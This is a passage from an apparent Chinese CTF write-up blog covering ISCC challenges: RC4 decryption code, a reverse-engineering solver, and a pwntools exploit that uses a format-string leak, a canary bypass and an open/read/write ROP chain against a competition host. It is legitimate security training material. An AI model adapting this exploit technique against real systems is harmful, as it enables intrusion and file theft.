<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* key, <span class="type">int</span> key_Len,<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">int</span> data_Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span>  <span class="type">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + s[i] + key[i % key_Len]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> q = <span class="number">0</span>;</span><br><span class="line">    i = j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (q = <span class="number">0</span>; q &lt; data_Len; q++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        data[q] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">42</span>] = &#123;<span class="number">0x1C</span>,<span class="number">0xB8</span>,<span class="number">0x2E</span>,<span class="number">0x47</span>,<span class="number">0xDD</span>,<span class="number">0x72</span>,<span class="number">0x1C</span>,<span class="number">0xA2</span>,<span class="number">0xDE</span>,<span class="number">0x13</span>,<span class="number">0x32</span>,<span class="number">0x46</span>,<span class="number">0xC8</span>,<span class="number">0xF0</span>,<span class="number">0x59</span>,<span class="number">0x81</span>,<span class="number">0xB0</span>,<span class="number">0xE6</span>,<span class="number">0xE4</span>,<span class="number">0xEE</span>,<span class="number">0x03</span>,<span class="number">0x9A</span>,<span class="number">0x58</span>,<span class="number">0x28</span>,<span class="number">0x4E</span>,<span class="number">0x6B</span>,<span class="number">0x9F</span>,<span class="number">0xE8</span>,<span class="number">0x80</span>,<span class="number">0x24</span>,<span class="number">0x82</span>,<span class="number">0x3F</span>,<span class="number">0xD6</span>,<span class="number">0x15</span>,<span class="number">0x68</span>,<span class="number">0x17</span>,<span class="number">0xEE</span>,<span class="number">0x91</span>,<span class="number">0xD7</span>,<span class="number">0xFE</span>,<span class="number">0x35</span>,<span class="number">0x74</span>,&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* key = <span class="string">&quot;SecretKey&quot;</span>;</span><br><span class="line">    rc4(key, <span class="built_in">strlen</span>(key), flag, <span class="number">42</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i] = (flag[i] - <span class="string">&#x27;a&#x27;</span> + <span class="number">26</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i] = (flag[i] - <span class="string">&#x27;A&#x27;</span> + <span class="number">26</span> - <span class="number">3</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i] ^ <span class="number">65</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ISCC&#123;N#ZGDg7q[j1Odaf&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="reverse2-uglyCpp"><a href="#reverse2-uglyCpp" class="headerlink" title="reverse2-uglyCpp"></a>reverse2-uglyCpp</h2><p>ida反编译，在main函数按f5反编译，</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re2-1.png" alt="re2-1"></p>
<p>进入此函数，发现<img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re2-2.png" alt="re2-2"></p>
<p>对这些数字按h，转换成16进制</p>
<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/re2-3.png" alt="re2-3"></p>
<p>所以写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x3ED6325B</span>,<span class="number">0xD709BF17</span>,<span class="number">0xE3F27E18</span>,<span class="number">0xA0870791</span>,<span class="number">0x146D6F9</span>,<span class="number">0x7C6140FF</span>,<span class="number">0x10B69406</span>,<span class="number">0x94DDE0F6</span>,<span class="number">0x40B2BB6C</span>]</span><br><span class="line">res = [<span class="number">0x53854801</span>,<span class="number">0x943EDE20</span>,<span class="number">0x0A09A1865</span>,<span class="number">0x0F0B26BC2</span>, <span class="number">0x463CB282</span>, <span class="number">0x320939B6</span>, <span class="number">0x41DBF048</span>, <span class="number">0x0A39CB5B5</span>, <span class="number">0x26DFDC3C</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    flag.append(<span class="built_in">hex</span>(key[i]^res[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((flag))</span><br><span class="line">hex_strings = flag</span><br><span class="line">decoded_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> hex_string <span class="keyword">in</span> hex_strings:</span><br><span class="line">    hex_string = hex_string[<span class="number">2</span>:]</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_string), <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">1</span> &lt; <span class="built_in">len</span>(hex_string):</span><br><span class="line">            byte = <span class="built_in">int</span>(hex_string[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">            tmp += <span class="built_in">chr</span>(byte)</span><br><span class="line">    decoded_flag += tmp[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = decoded_flag</span><br><span class="line">word1 = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">word2 = <span class="string">&quot;vfw8xgy4zh9i2j0k5lam1nbo6pcq3rds7teu&quot;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(word1)):</span><br><span class="line">    tmp = word2.index(word1[i])</span><br><span class="line">    res +=flag[tmp]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[&#x27;0x6d537a5a&#x27;, &#x27;0x43376137&#x27;, &#x27;0x4368667d&#x27;, &#x27;0x50356c53&#x27;, &#x27;0x477a647b&#x27;, &#x27;0x4e687949&#x27;, &#x27;0x516d644e&#x27;, &#x27;0x37415543&#x27;, &#x27;0x666d6750&#x27;]</span></span><br><span class="line"><span class="comment">#ISCC&#123;NPmh5zhmAmzafClPdGyNdQU7gfZS77&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="pwn1-Dilemma"><a href="#pwn1-Dilemma" class="headerlink" title="pwn1-Dilemma"></a>pwn1-Dilemma</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote connection</span></span><br><span class="line">p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12500</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./attachment-42&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gadgets and addresses</span></span><br><span class="line">pop_rdi = <span class="number">0x40119a</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x40119c</span></span><br><span class="line">bss = <span class="number">0x404000</span> + <span class="number">0x900</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;where are you go?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter you password:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;%39$p%11$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_start = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">128</span></span><br><span class="line">libc_base = libc_start - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;I will check your password:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;where are you go?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;We have a lot to talk about\n&quot;</span>)</span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(bss + <span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x4011c9</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">open_plt  = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_plt  = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x11f2e7</span>  </span><br><span class="line">rop  = <span class="string">b&#x27;./flag.txt&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">rop += p64(canary)</span><br><span class="line">rop += p64(ret)</span><br><span class="line">rop += p64(pop_rdi) + p64(bss)</span><br><span class="line">rop += p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(open_plt)</span><br><span class="line"></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_r15) + p64(bss + <span class="number">0x200</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(read_plt)</span><br><span class="line"></span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_r15) + p64(bss + <span class="number">0x200</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(write_plt)</span><br><span class="line"></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#ISCC&#123;71daee4d-9026-46df-93e6-52d17b786114&#125;</span></span><br></pre></td></tr></table></figure>


    </div>

    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p><h4>版权所有 © 2020 | 作者: Huaji | 主题 By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
    
    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
        <input type="checkbox" name="switch" id="update_style">
        <span class="el-switch-style"></span>
    </label>

    <!--         <script type="text/javascript">
    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
    </script> -->
</p>
</div>

<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="">
<input type="hidden" id="valine_appKey" value="">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
color: #698fca;
}
.v .vlist .vcard .vhead .vsys {
color: #3a3e4a;
}
.v .vlist .vcard .vh .vmeta .vat {
color: #638fd5;
}
.v .vlist .vcard .vhead .vnick {
color: #6ba1ff;
}
.v a {
color: #8696b1;
}
.v .vlist .vcard .vhead .vnick:hover {
color: #669bfc;
}
</style>
    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
</body>
</html>
